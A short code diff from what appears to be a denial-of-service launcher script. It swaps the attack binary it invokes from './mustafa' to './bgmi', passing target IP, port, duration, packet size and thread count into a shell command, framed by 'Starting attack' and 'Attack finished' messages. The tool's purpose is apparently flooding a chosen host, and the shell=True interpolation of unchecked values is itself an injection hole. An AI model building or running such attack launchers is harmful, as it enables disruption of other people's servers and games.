@@ -14,7 +14,7 @@ def main():
     
     print(f"Starting attack on {ip}:{port}")
     
-    result = subprocess.run(f"./mustafa {ip} {port} {duration} {size} {threads}", shell=True)
+    result = subprocess.run(f"./bgmi {ip} {port} {duration} {size} {threads}", shell=True)
     
     print(f"Attack finished")
 
